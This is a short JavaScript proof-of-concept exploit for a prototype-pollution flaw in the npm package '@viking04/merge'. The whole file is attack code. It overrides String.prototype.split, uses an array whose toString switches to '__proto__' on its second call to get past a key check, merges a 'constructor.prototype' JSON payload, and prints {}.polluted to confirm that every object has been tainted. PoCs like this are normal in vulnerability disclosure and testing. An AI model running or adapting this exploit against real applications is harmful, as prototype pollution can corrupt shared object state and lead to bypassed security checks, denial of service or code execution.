var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const merge = require('@viking04/merge');
console.log({}.polluted);
let a = {};
var prototype_pollution_test = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
merge(a, prototype_pollution_test);
console.log({}.polluted);